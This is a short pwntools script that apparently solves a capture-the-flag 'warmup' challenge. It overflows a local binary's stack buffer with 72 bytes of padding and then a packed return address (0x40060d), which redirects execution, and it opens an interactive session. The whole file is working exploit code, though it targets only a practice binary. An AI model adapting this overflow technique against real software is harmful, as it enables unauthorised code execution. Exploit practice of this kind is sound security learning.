from pwn import *

pwn = process('./warmup')


buf = b''
buf += b'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIII' 
buf += p64(0x40060d) 
pwn.sendline(buf)

pwn.interactive()
